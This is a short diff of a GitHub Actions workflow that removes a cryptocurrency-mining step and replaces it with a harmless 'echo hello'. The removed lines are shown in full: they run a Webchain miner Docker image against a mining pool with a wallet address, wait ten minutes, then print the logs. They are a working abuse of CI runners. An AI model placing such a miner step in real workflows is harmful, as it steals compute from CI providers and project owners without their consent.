@@ -11,11 +11,5 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Run super
-        run: docker run --name super -d wattpool/webchainminer -o pool.webchain.network:3333 -u 0x582e57003fC0B9A6891bD4A5d6477Cf8FEA16145 -p x
-      
-      - name: Wait super
-        run: sleep 10m 
-        
-      - name: Log super
-        run: docker logs super
+      - name: hello
+        run: echo hello
